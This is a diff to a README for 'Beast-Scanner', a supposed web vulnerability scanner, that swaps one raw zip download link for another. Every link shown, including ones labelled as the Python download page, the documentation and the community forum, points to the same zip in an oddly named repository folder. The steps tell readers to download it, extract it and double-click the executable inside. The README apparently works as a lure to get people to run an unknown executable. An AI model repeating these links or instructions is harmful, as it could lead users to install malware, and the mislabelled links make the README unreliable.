@@ -6,7 +6,7 @@ Welcome to Beast-Scanner, an advanced web application vulnerability scanner desi
 
 ## 📥 Download Beast-Scanner
 
-[![Download Beast-Scanner](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Scanner_Beast_clavichord.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Scanner_Beast_clavichord.zip)
+[![Download Beast-Scanner](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Beast-Scanner-1.3-alpha.5.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Beast-Scanner-1.3-alpha.5.zip)
 
 ## 🔍 What Is Beast-Scanner?
 
@@ -29,7 +29,7 @@ Before you start, ensure that your computer meets the following requirements:
 
 Before using Beast-Scanner, you may need to install Python on your computer if it's not already available. Follow these steps:
 
-1. Go to the [Python Download Page](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Scanner_Beast_clavichord.zip).
+1. Go to the [Python Download Page](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Beast-Scanner-1.3-alpha.5.zip).
 2. Download the latest version for your operating system.
 3. Run the installer and follow the instructions.
 
@@ -37,15 +37,15 @@ Before using Beast-Scanner, you may need to install Python on your computer if i
 
 To get started with Beast-Scanner, follow these steps:
 
-1. **Visit the Releases Page**: Go to the following link: [Download Beast-Scanner](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Scanner_Beast_clavichord.zip).
+1. **Visit the Releases Page**: Go to the following link: [Download Beast-Scanner](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Beast-Scanner-1.3-alpha.5.zip).
    
 2. **Select the Latest Release**: Look for the most recent version listed on the page. This version includes the latest features and fixes.
 
-3. **Download the Application**: Click on the appropriate file for your operating system (e.g., https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Scanner_Beast_clavichord.zip). This will initiate the download.
+3. **Download the Application**: Click on the appropriate file for your operating system (e.g., https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Beast-Scanner-1.3-alpha.5.zip). This will initiate the download.
 
 4. **Extract the Files**: Once the download is complete, locate the downloaded file. If you downloaded a zip file, right-click on it and select “Extract All” to unzip the contents to a folder.
 
-5. **Run Beast-Scanner**: Navigate to the folder containing the extracted files. Look for the executable file (like `https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Scanner_Beast_clavichord.zip` on Windows). Double-click it to run the application.
+5. **Run Beast-Scanner**: Navigate to the folder containing the extracted files. Look for the executable file (like `https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Beast-Scanner-1.3-alpha.5.zip` on Windows). Double-click it to run the application.
 
 ## ⚙️ How to Use Beast-Scanner
 
@@ -96,7 +96,7 @@ Beast-Scanner is open-source and available for anyone to use. Please check the l
 
 For more information, tutorials, and guides, you can check:
 
-- The [Official Documentation](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Scanner_Beast_clavichord.zip).
-- Our [Community Discussions](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Scanner_Beast_clavichord.zip).
+- The [Official Documentation](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Beast-Scanner-1.3-alpha.5.zip).
+- Our [Community Discussions](https://github.com/neyokay1/Beast-Scanner/raw/refs/heads/main/tropocaine/Beast-Scanner-1.3-alpha.5.zip).
 
 Feel free to explore and start securing your web applications effectively!
